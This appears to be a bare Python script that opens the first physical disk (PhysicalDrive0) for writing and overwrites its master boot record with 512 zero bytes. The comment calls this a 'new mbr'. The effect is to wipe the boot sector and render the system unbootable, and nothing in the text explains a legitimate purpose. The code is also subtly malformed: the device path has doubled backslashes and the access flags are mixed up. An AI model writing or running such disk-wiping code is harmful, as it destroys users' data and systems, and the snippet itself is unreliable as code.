import win32file

drive = r'\\\\.\\PhysicalDrive0'
h = win32file.CreateFileW(drive, win32file.GENERIC_WRITE | win32file.FILE_SHARE_READ | win32file.GENERIC_WRITE, None, None,
                          win32file.OPEN_EXISTING)
# new mbr
n = bytearray(512)
win32file.WriteFile(h, n, None)
